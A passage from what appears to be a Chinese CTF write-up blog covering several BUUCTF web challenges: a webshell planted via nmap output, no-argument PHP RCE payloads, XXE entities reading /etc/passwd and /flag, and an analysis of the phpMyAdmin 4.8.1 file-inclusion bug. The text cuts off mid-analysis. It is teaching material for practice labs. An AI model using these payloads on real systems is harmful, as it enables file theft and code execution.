php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       <span class="meta">?&gt;</span> -oG muma.php <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>蚁剑链接，早最高一级目录找到 flag</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b07.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b07.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>也可以打开终端 cat /flag 得到 flag</p><p f718f3f2-717f-411a-8d4d-449f5f3ff03c>flag</p><h2 id="gxyctf2019禁止套娃"><a class="markdownIt-Anchor" href="#gxyctf2019禁止套娃">#</a> [GXYCTF2019] 禁止套娃</h2><p>学习链接：<a href="https://blog.csdn.net/m0_62879498/article/details/124538469">https://blog.csdn.net/m0_62879498/article/details/124538469</a></p><p>无参数 RCE 总结：<a href="https://blog.csdn.net/Manuffer/article/details/120738755%E3%80%81https://blog.csdn.net/2301_76690905/article/details/133808536">https://blog.csdn.net/Manuffer/article/details/120738755、https://blog.csdn.net/2301_76690905/article/details/133808536</a></p><p>进去就发现是个除了 <code>flag在哪里呢？</code> 这段文字就白的不能再白的页面了，源码也没有，dirsearch 扫描也没有什么其他的文件但是有 /.git 的东西，看了别的师傅的 wp 才知道这个是源码泄露，利用 GitHack 获取源码</p><p>贴一个 GitHack 下载地址：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b08.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b08.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>扫描完得到一个 index.php，获取到源码了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计：</p><p>可以看到 preg_match 把 php 伪协议给禁用了，不能使用 data、filter 等</p><p>如果 <code>';'===preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp']))</code> ，那么就执行 exp 的内容</p><p>对于 <code>[a-z,_]+</code>  的解释 :  <code>[a-z,_]</code>  匹配小写字母和下划线  <code>+</code>  表示 1 到多个</p><p>对于 <code>(?R)?</code>  的解释 :  <code>(?R)</code>  代表当前表达式，就是这个 <code>(/[a-z,_]+((?R)?)/)</code> ，所以会一直递归，? 表示递归当前表达式 0 次或 1 次（若是 <code>(?R)*</code>  则表示递归当前表达式 0 次或多次，例如它可以匹配 a (b (c () d ()))）</p><p><code>preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp']))</code>  又进行了一次黑名单过滤，类似带有 et、na、info 等字样的函数都不能用了，get、phpinfo 等等都不行了</p><p>这里就要用到无参数 rce 了，相关函数做个记录：</p><blockquote><p>scandir () ：将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob () 可替换）</p><p>localeconv () ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个。的用处很大）</p><p>current () ：返回数组中的单元，默认取第一个值。注：pos () 和 current () 是同一个东西</p><p>pos () ：返回数组中的当前元素的值。pos 是 current 的别名。</p><p>getcwd () ：取得当前工作目录</p><p>dirname ()：返回路径中的目录部分</p><p>array_flip ()：交换数组中的键和值，成功时返回交换后的数组</p><p>array_rand () ：从数组中随机取出一个或多个单元</p><p>array_reverse ()：将数组内容反转</p><p>strrev ()：用于反转给定字符串</p><p>chdir () ：函数改变当前的目录。</p><p>eval ()、assert ()：命令执行</p><p>hightlight_file ()、show_source ()、readfile ()：读取文件内容</p></blockquote><p>查看当前目录下文件，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=var_dump(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b09.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b09.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到这个数组，我们想要获取到 flag.php，他在数组的倒二个，我们可以把数组反转然后再用 next () 来获取第二个文件就是 flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=var_dump(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b11.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>highlight_file 读取 flag.php 文件，最终 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b10.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p a6011114-33f1-49c3-a301-c5027b9b4897>拿到 flag，flag</p><h2 id="nctf2019fake-xml-cookbook"><a class="markdownIt-Anchor" href="#nctf2019fake-xml-cookbook">#</a> [NCTF2019]Fake XML cookbook</h2><p>进页面之后尝试 admin 登录失败，抓包也没有获得什么信息。题目提示说 XML，查查看，看到了 XML External Entity Injection 即 xml 外部实体注入漏洞，贴一个学习链接：<a href="https://www.freebuf.com/vuls/175451.html%E3%80%81https://www.cnblogs.com/s1awwhy/p/13736633.html%E3%80%82">https://www.freebuf.com/vuls/175451.html、https://www.cnblogs.com/s1awwhy/p/13736633.html。</a></p><p>做一个简单的记录：</p><blockquote><p>XXE 漏洞全称 XML External Entity  Injection 即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起 dos 攻击等危害。xxe 漏洞触发的点往往是可以上传 xml 文件的位置，没有对上传的 xml 文件进行过滤，导致可上传恶意 xml 文件。</p><p><strong>XML</strong></p><ul><li><p>XML 被设计为传输和存储数据，其焦点是数据的内容。</p></li><li><p>HTML 被设计用来显示数据，其焦点是数据的外观。</p></li></ul><p>XML 把数据从 HTML 分离，XML 是独立于软件和硬件的信息传输工具。</p><p>基本语法：</p><ul><li><p>所有 XML 元素都须有关闭标签。</p></li><li><p>XML 标签对大小写敏感。</p></li><li><p>XML 必须正确地嵌套。</p></li><li><p>XML 文档必须有根元素。</p></li><li><p>XML 的属性值须加引号</p></li></ul><p>实体引用，这里看个例子，如果你把字符 “&lt;” 放在 XML，素中，会发生错误，这是因为解析器会把它当作新元素的开始。这样会产生 XML 错误：</p><p><code>&lt;message&gt;hello &lt; world&lt;/message&gt;</code> , 为了避免错误。我们用实体引用 <code>&amp;lt;</code>  来代替 &quot;&lt;&quot; 字符。XML 中，有 5 个预定义的实体引用。</p><table><thead><tr><th>实体名称</th><th>显示结果</th><th>描述</th></tr></thead><tbody><tr><td>&amp;It;</td><td>&lt;</td><td>小于</td></tr><tr><td>&amp;gt;</td><td>&gt;</td><td>大于</td></tr><tr><td>&amp;amp;</td><td>&amp;</td><td>和号</td></tr><tr><td>&amp;apos;</td><td>’</td><td>单引号</td></tr><tr><td>&amp;quot;</td><td>&quot;</td><td>引号</td></tr></tbody></table><p>注意：在 XML 中，只有字符 &quot;&lt;“和”&amp;&quot; 是确实非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。</p><p>在 XML 中，空格会被保留，多个空格不会被合并为一个。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;bookstore&gt; &lt;!--根元素--&gt;</span><br><span class="line">&lt;book category=&quot;COOKING&quot;&gt; &lt;!--bookstore的子元素，category为属性--&gt;</span><br><span class="line">&lt;title&gt;Everyday Italian&lt;/title&gt; &lt;!--book的子元素，lang为属性--&gt;</span><br><span class="line">&lt;author&gt;Giada De Laurentiis&lt;/author&gt; &lt;!--book的子元素--&gt;</span><br><span class="line">&lt;year&gt;2005&lt;/year&gt; &lt;!--book的子元素--&gt;</span><br><span class="line">&lt;price&gt;30.00&lt;/price&gt; &lt;!--book的子元素--&gt;</span><br><span class="line">&lt;/book&gt; &lt;!--book的结束--&gt;</span><br><span class="line">&lt;/bookstore&gt; &lt;!--bookstore的结束--&gt;</span><br></pre></td></tr></table></figure><p><strong>DTD</strong></p><p>文档类型定义（DTD）可定义合法的 XML 文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。带有 DTD 的 XML 文档实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Y0u&lt;/to&gt;</span><br><span class="line">&lt;from&gt;@re&lt;/from&gt;</span><br><span class="line">&lt;head&gt;v3ry&lt;/head&gt;</span><br><span class="line">&lt;body&gt;g00d!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>当使用外部 DTD 时，通过如下语法引入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</span><br></pre></td></tr></table></figure><p>外部 OTD 实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Y0u&lt;/to&gt;</span><br><span class="line">&lt;from&gt;@re&lt;/from&gt;</span><br><span class="line">&lt;head&gt;v3ry&lt;/head&gt;</span><br><span class="line">&lt;body&gt;g00d!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p><strong>DTD - 实体 (重要)</strong></p><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体引用是对实体的引用。实体可以在内部或外部进行声明</p><p><strong>内部实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>外部实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>参数实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %实体名称 &quot;值&quot;&gt;</span><br><span class="line">&lt;!ENTITY %实体名称 SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>参数实体 + 外部实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">  &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">  %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><code>%name</code>  (参数实体) 是在 DTD 中被引用的，而 <code>&amp;name;</code>  是在 xml 文档中被引用的。</p><p>XXE 主要是利用了 DTD 引用外部实体导致的漏洞。</p><p>外部引用可支持 http、file 等协议，不同的语言支持的协议不同，但存在一些通用的协议。例如：</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b12.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><strong>实际利用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;root&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><strong>XXE 的危害：</strong></p><ul><li>任意文件读取。利用 file、http 协议，在 DTD 外部引用中注入，从而获取文件内容。任意文件读取有分为有回显和无回显两种。</li><li>命令执行。php 环境下，xml 命令执行要求 php 装有 expect 扩展。而该扩展默认没有安装。</li><li>内网探测 / SSRF。由于 xml 实体注入攻击可以利用 http:// 协议，也就是可以发起 http 请求。可以利用该请求去探查内网，进行 SSRF 攻击。</li><li>攻击内网网站。</li></ul></blockquote><p>回到题目，构造 payload 尝试文件读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b13.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>成功，尝试获取 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b14.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 1bb61c65-9ae8-4d08-8106-1936c2805383>成功拿到 flag，flag</p><h2 id="gwctf-2019我有一个数据库"><a class="markdownIt-Anchor" href="#gwctf-2019我有一个数据库">#</a> [GWCTF 2019] 我有一个数据库</h2><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b15.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>进来的页面一堆乱七八糟的内容。。。而且源码也没什么信息，dirsearch 开扫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://9a9ffbc2-edb6-47c4-9207-d90ccb6245fb.node5.buuoj.cn:81/ -e *</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b16.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>看看 robots.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: phpinfo.php</span><br></pre></td></tr></table></figure><p>看看能不能从 phpinfo 里面得到什么信息</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b17.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>没看到什么有用的信息，结合题目提到的数据库和扫描出的 phpmyadmin，应该重点关注 phpmyadmin/index.php</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b18.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b18.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>进入页面之后得到 phpmyadmin 的信息 <code>phpMyAdmin版本信息： 4.8.1</code> ，查找一下相关漏洞，找到 CVE-2018-12613 PHPmyadmin 文件包含漏洞分析及漏洞利用</p><p>链接：<a href="https://blog.csdn.net/weixin_41924764/article/details/109701126%E3%80%81https://blog.csdn.net/weixin_44037296/article/details/111039461">https://blog.csdn.net/weixin_41924764/article/details/109701126、https://blog.csdn.net/weixin_44037296/article/details/111039461</a></p><p>最为具体的是这一个：<a href="https://blog.csdn.net/m0_46898243/article/details/106244110">https://blog.csdn.net/m0_46898243/article/details/106244110</a></p><p>这里简单记录一下：</p><blockquote><p>在 4.8.2 之前的 phpMyAdmin 4.8.x 中发现了一个问题，攻击者可以在其中包含（查看并可能执行）服务器上的文件。该漏洞来自页面重定向和在 phpMyAdmin 中加载的部分代码，以及对列入白名单的页面的不正确测试。除 “$ cfg [‘AllowArbitraryServer’] = true” 情况（攻击者可以指定他 / 她已经控制的任何主机，并在 phpMyAdmin 上执行任意代码）外，攻击者还必须经过身份验证。 [‘ServerDefault’] = 0“的情况（绕过登录要求，并在没有任何身份验证的情况下运行易受攻击的代码）。</p><p>下载 phpMyAdmin 4.8.1 源码 https://www.phpmyadmin.net/files/4.8.1/<br> 漏洞问题出现在 index.php 页面 55~63：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// If we have a valid target, let&#x27;s load that script instead</span><br><span class="line">if (! empty($_REQUEST[&#x27;target&#x27;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#x27;target&#x27;])</span><br><span class="line">    &amp;&amp; ! preg_match(&#x27;/^index/&#x27;, $_REQUEST[&#x27;target&#x27;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#x27;target&#x27;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&#x27;target&#x27;])</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&#x27;target&#x27;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>include $_REQUEST['target'];</code>  可能存在<strong>文件包含</strong>漏洞， <code>$target</code>  变量中不能以 <code>index</code>  开头，且不能是 <code>$target_blacklist</code>  黑名单中的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Black list of all scripts to which front-end must submit data.</span><br><span class="line"> * Such scripts must not be loaded on home page.</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">$target_blacklist = array (</span><br><span class="line">    &#x27;import.php&#x27;, &#x27;export.php&#x27;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>只要不是 <code>import.php</code>  或 <code>export.php</code>  即可</p><p>满足 <code>Core</code>  类的 <code>checkPageValidity()</code>  方法，在 <code>phpMyAdmin/libraries/classes/Core.php</code>  中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">* boolean phpMyAdmin.Core::checkPageValidity(string &amp;$page, array $whitelist)</span><br><span class="line">*</span><br><span class="line">* checks given $page against given $whitelist and returns true if valid</span><br><span class="line">* it optionally ignores query parameters in $page (script.php?ignored)</span><br><span class="line">*</span><br><span class="line">* @param string &amp;$page     page to check</span><br><span class="line">* @param array  $whitelist whitelist to check page against</span><br><span class="line">*</span><br><span class="line">* @return boolean whether $page is valid or not (in $whitelist or not)</span><br><span class="line">*/</span><br><span class="line">public static function checkPageValidity(&amp;$page, array $whitelist = [])</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($whitelist)) &#123;</span><br><span class="line">        $whitelist = self::$goto_whitelist;</span><br><span class="line">    &#125;</span><br><span class="line">    if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (in_array($page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_page = mb_substr(         $page,</span><br><span class="line">        0,</span><br><span class="line">        mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">    );</span><br><span class="line">    if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    $_page = urldecode($page);</span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        0,</span><br><span class="line">        mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">    );</span><br><span class="line">    if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码：</p><ul><li>需要让该函数返回 <code>true</code> ，也就是变量 <code>$_page</code>  